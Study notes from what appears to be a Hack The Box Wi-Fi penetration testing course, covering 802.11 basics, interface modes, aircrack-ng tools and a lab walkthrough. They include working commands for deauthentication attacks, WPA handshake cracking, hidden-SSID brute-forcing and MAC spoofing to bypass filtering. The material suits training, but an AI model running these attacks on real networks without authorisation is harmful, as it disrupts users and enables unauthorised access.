# Wi-Fi Penetration Testing Basics

1. [802.11 Fundamentals](#80211-fundamentals)
1. [Interfaces and Interface Modes](#interfaces-and-interface-modes)
1. [Aircrack-ng](#aircrack-ng)
1. [Basic Control Bypass](#basic-control-bypass)
1. [Skills Assessment](#skills-assessment)

## 802.11 Fundamentals

* Primary authentication systems in WiFi networks include Open System Authentication and Shared Key Authentication

* Main Wi-Fi authentication types under Shared Key Authentication include WEP (Wired Equivalent Privacy), WPA (WiFi Protected Access), WPA2 and WPA3

* WiFi pentest involves evaluating passphrases, configuration of routers & access points, testing the network infrastructure and the connected clients

* All IEEE 802.11 frames use the MAC data frame, which consists of 9 fields -

    * Frame Control
    * Duration/ID
    * Address 1,2,3,4
    * SC (Sequence Control)
    * Data
    * CRC (Cyclic Redundancy Check)

* 802.11 frame types -

    * Management (00) -
    
      * beacon frames (1000)
      * probe request (0100) & probe response (0101)
      * authentication request & response (1011)
      * association/reassociation request & responses (0000, 0001, 0010, 0011)
      * disassociation/deauthentication (1010, 1100)

    * Control (01)
    * Data (10)

* We can view certain frames in captured network traffic in Wireshark using filters; for example, to view beacon frames from the access point, we can use the filter ```(wlan.fc.type == 0) && (wlan.fc.type_subtype == 8)```, and to view authentication process between client and access point, use the filter ```(wlan.fc.type == 0) && (wlan.fc.type_subtype == 11)```

## Interfaces and Interface Modes

* Interfaces:

  ```sh
  # for pentesting, interfaces should support 2.4G and 5G
  # and have features like monitor mode and packet injection

  # check interface strength
  iwconfig

  # check txpower settings for country
  iw reg get

  # change region settings
  sudo iw reg set US

  # to modify txpower
  # bring the interface down first, then change

  sudo ifconfig wlan0 down
  sudo iwconfig wlan0 txpower 30
  sudo ifconfig wlan0 up

  # verify changes
  iwconfig

  # check driver capabilities
  iw list

  # scan available wifi networks
  iwlist wlan0 scan | grep 'Cell\|Quality\|ESSID\|IEEE'

  # list all available channels for interface
  iwlist wlan0 channel

  # change channel of interface

  sudo ifconfig wlan0 down
  sudo iwconfig wlan0 channel 64
  sudo ifconfig wlan0 up

  # verify changes
  iwlist wlan0 channel

  # check frequency
  iwlist wlan0 frequency | grep Current

  # change frequency of interface

  sudo ifconfig wlan0 down
  sudo iwconfig wlan0 freq "5.52G"
  sudo ifconfig wlan0 up

  # verify changes
  iwlist wlan0 frequency | grep Current
  ```

* Interface modes:

  * Managed mode - when we want interface to act as a client/station; it allows us to authenticate and associate to an access point

    ```sh
    sudo ifconfig wlan0 down

    # set interface to managed mode
    sudo iwconfig wlan0 mode managed

    # to connect to a network
    sudo iwconfig wlan0 essid HTB-Wifi

    # to check interface
    sudo iwconfig
    ```
  
  * Ad-hoc mode - peer-to-peer mode, allows wireless interfaces to communicate directly to one another; used in mesh systems

    ```sh
    sudo ifconfig wlan0 down

    sudo iwconfig wlan0 mode ad-hoc
    # we can connect to a network after this
    ```
  
  * Master mode - opposite of managed mode; management daemon is used to set the interface for responding to clients connecting to the network

    ```sh
    vim open.conf
    # we can create a sample config for an open network
    # here, set the values for interface, driver, ssid, channel, etc.

    sudo hostapd open.conf
    # brings up the network
    ```
  
  * Mesh mode - turns interface to a mesh point, to join a self-configuring & routing network

    ```sh
    sudo iw dev wlan0 set type mesh

    sudo iwconfig
    # verify interface
    ```
  
  * Monitor mode - interface can capture all wireless traffic within its range

    ```sh
    sudo ifconfig wlan0 down

    sudo iw wlan0 set monitor control

    sudo ifconfig wlan0 up

    sudo iwconfig
    # verify monitor mode
    ```

## Aircrack-ng

* airmon-ng:

  ```sh
  sudo airmon-ng
  # shows wireless interface name, driver, chipset

  # airmon-ng can be used to toggle monitor mode on interface
  sudo airmon-ng start wlan0

  iwconfig
  # check if interface is in monitor mode
  # the name of the interface also changes from 'wlan0' to 'wlan0mon'

  sudo airmon-ng check
  # check for interfering processes in case monitor mode does not work

  # kill interfering processes
  sudo airmon-ng check kill

  # start monitor mode on a specific channel
  sudo airmon-ng start wlan0 11

  # stop monitor mode
  sudo airmon-ng stop wlan0mon
  ```

* airodump-ng:

  ```sh
  # after activating monitor mode on interface
  # we can use airodump-ng to capture wireless traffic

  sudo airmon-ng start wlan0

  iwconfig
  # verify interface is in monitor mode

  sudo airodump-ng wlan0mon
  # start scanning on interface
  # this gives us a table of wireless data

  # scanning specific channels
  sudo airodump-ng -c 11 wlan0mon

  # scanning only 5 ghz wifi bands - 802.11a
  sudo airodump-ng wlan0mon --band a

  # save output to a file
  sudo airodump-ng wlan0mon -w HTB
  # generates multiple files with different suffixes
  # .csv, .kismet.netxml, .cap, .kismet.csv, .log.csv
  ```

* airgraph-ng:

  ```sh
  # airgraph-ng creates 2 types of graphs from CSV files

  sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png
  # creates client to AP relationship graph

  sudo airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png
  # creates common probe graph
  ```

* aireplay-ng:

  ```sh
  # used to generate traffic for aircrack-ng
  # to crack WEP and WPA-PSK keys

  aireplay-ng
  # lists all supported attack modes

  # testing for packet injection
  sudo iw dev wlan0mon set channel 1
  # set channel to interface to 1
  # we can also use 'airmon-ng start wlan0 1' command

  # now to check the interface
  sudo aireplay-ng --test wlan0mon
  # we should see the message 'Injection is working'

  # view available wifi networks
  sudo airodump-ng wlan0mon
  # get the station ID (MAC address) of one of the connected clients
  
  # we can send a deauthentication request to that client
  sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
  # -0 is for deauthentication attack
  # 5 is the number of deauths to send, if we use 0 here deauths will be sent continuously
  # -a to define BSSID - MAC address of access point
  # -c to define station ID - MAC address of client - if this is not defined all clients are deauthenticated

  sudo airodump-ng wlan0mon
  # to check if clients reconnect after deauth
  ```

* airdecap-ng:

  ```sh
  # tool for decrypting WEP, WPA PSK, and WPA2 PSK captures
  # can also be used to analyze data from captured packets

  # suppose we have a capture file from an open network
  # we can remove wireless headers from the unencrypted capture
  sudo airdecap-ng -b 00:14:6C:7A:41:81 opencapture.cap
  # -b for BSSID - MAC of access point
  # this creates a decrypted file

  # decrypt WEP-encrypted captures
  sudo airdecap-ng -w 1234567890ABCDEF HTB-01.cap
  # -w for the WEP key

  # decrypt WPA-encrypted captures
  sudo airdecap-ng -p 'abdefg' HTB-01.cap -e "Wireless Lab"
  # -p for WPA passphrase
  # -e for ESSID - name of network
  ```

* aircrack-ng:

  ```sh
  # offline attack tool

  # benchmark test
  aircrack-ng -S

  # once enough packets are captured in airodump-ng
  # we can crack WEP encryption
  # we can use --ivs flag in airodump-ng to save only captured IVs
  aircrack-ng -K HTB.ivs
  # -K for cracking WEP key from captured IVs

  # cracking WPA after 4-way handshake captured in airodump-ng
  aircrack-ng HTB.pcap -w wordlist.txt
  ```

## Basic Control Bypass

* Connecting to WiFi networks:

  ```sh
  sudo iwlist wlan0 s | grep 'Cell\|Quality\|ESSID\|IEEE'
  # scan available networks
  # interface can be in managed mode

  # to connect to a network, we can use wpa_supplicant with config file

  # we can also connect using tools like 'nmtui' or via GUI
  ```

  * WEP networks:

    ```conf
    network={
      ssid="HackTheBox"
      key_mgmt=NONE
      wep_key0=3C1C3A3BAB
      wep_tx_keyidx=0
    }
    ```

    ```sh
    sudo wpa_supplicant -c wep.conf -i wlan0
    # -c for config file
    # -i for interface

    sudo dhclient wlan0
    # to obtain IP from DHCP server

    ifconfig wlan0
    # verify
    ```
  
  * WPA personal networks:

    ```conf
    network={
      ssid="HackMe"
      psk="password123"
    }
    ```

    ```sh
    sudo wpa_supplicant -c wpa.conf -i wlan0

    # if we have a previously assigned DHCP IP
    # we need to release it first
    sudo dhclient wlan0 -r

    # now assign DHCP IP
    sudo dhclient wlan0

    ifconfig wlan0
    # verify
    ```
  
  * WPA enterprise networks:

    ```conf
    network={
      ssid="HTB-Corp"
      key_mgmt=WPA-EAP
      identity="HTB\Administrator"
      password="Admin@123"
    }
    ```

    ```sh
    sudo wpa_supplicant -c wpa_enterprise.conf -i wlan0

    sudo dhclient wlan0 -r

    sudo dhclient wlan0

    ifconfig wlan0
    ```

* Finding hidden SSIDs:

  ```sh
  # set interface to monitor mode
  sudo airmon-ng start wlan0

  # scan wifi networks
  sudo airodump-ng -c 1 wlan0mon
  # hidden SSIDs have ESSID in '<length: x>' format
  # where x is number of characters in SSID name
  ```

  * Finding hidden SSID using Deauth:

    ```sh
    # we can deauth a client and capture request when reconnecting

    # start sniffing on channel 1
    sudo airodump-ng -c 1 wlan0mon

    # deauth attack for connected client seen in airodump-ng scan
    sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon

    # now if we check the running airodump-ng scan
    # we can see the name of the hidden SSID once client reconnects
    ```
  
  * Bruteforcing hidden SSID:

    ```sh
    # we can use tools like 'mdk3' to bruteforce SSID name

    sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
    # p - test mode for basic probing and ESSID bruteforce
    # -b - bruteforce with all possible values
    # possible options include upper case (u), digits (n), all printed (a), lower and upper (c), lower and upper and numbers (m)
    # -t - MAC address of target access point
    # -c - channel

    # -f for using a wordlist
    sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
    ```

* Bypass MAC filtering:

  ```sh
  # MAC filtering allows only devices with specific MAC address to connect to network
  # MAC spoofing can be used to bypass this

  # scan available networks
  sudo airodump-ng wlan0mon

  # suppose we have the correct credentials for this network
  # but MAC filtering can prevent from connecting
  # we can try deauthenticating legit clients and spoofing their MAC
  
  # checking for networks on 5 GHz band
  # to avoid collision events as most clients are on 2.4 GHz band
  sudo airodump-ng wlan0mon --band a

  # stop monitor mode
  sudo airmon-ng stop wlan0mon

  # check current and permanent MAC address
  sudo macchanger wlan0

  # we can spoof MAC to one of the clients from 2.4 GHz band

  # disable wlan0 interface
  sudo ifconfig wlan0 down

  # change MAC address
  sudo macchanger wlan0 -m 3E:48:72:B7:62:2A

  # enable wlan0 interface
  sudo ifconfig wlan0 up

  # verify MAC spoofing
  ifconfig wlan0

  # we can now connect to the 5 GHz band

  # verify
  ifconfig
  ```

## Skills Assessment

  ```sh
  ifconfig
  # check interfaces

  sudo airmon-ng start wlan0

  iwconfig
  # confirm interface wlan0mon in monitor mode

  sudo airodump-ng wlan0mon
  # scan for networks

  # we have two hidden SSIDs here with SSID names of length 3 and 8
  # both are on channel 1

  # bruteforce SSID name for given BSSID - considering uppercase
  sudo mdk3 wlan0mon p -b u -c 1 -t D8:D6:3D:EB:29:D5
  # we get ESSID 'HTB'

  # to get password, we can use airodump with aircrack

  # scan across all bands
  sudo airodump-ng wlan0mon --band abg
  # we have ESSID 'GAMMER-5G' here

  # scan only on channel 1 since we have clients on this channel
  # write to capture
  sudo airodump-ng wlan0mon -c 1 -w HTB
  # this shows client associated

  # in new tab, deauthenticate connected client from target BSSID
  sudo aireplay-ng -0 10 -a D8:D6:3D:EB:29:D5 -c 02:00:00:00:02:00 wlan0mon

  # going back to the airodump-ng window
  # it says WPA handshake captured on top
  # we can stop this process now

  # crack the password using capture
  sudo aircrack-ng HTB-01.cap -w wordlist.txt
  # cracks password from wordlist

  # we do not see the 'HTB' network
  # so we can try bypassing MAC filtering
  # and connect to the same BSSID on 5 GHz band with ESSID 'Gammer-5G'
  
  # stop monitor mode
  sudo airmon-ng stop wlan0mon

  sudo macchanger wlan0
  # check current MAC

  # disable interface
  sudo ifconfig wlan0 down

  # spoof MAC to previously connected client
  sudo macchanger wlan0 -m 02:00:00:00:02:00

  # enable interface
  sudo ifconfig wlan0 up

  # we can now connect to 'Gammer-5G'
  # using the same cracked password

  # get flag
  wget -qO- 192.168.2.1
  ```
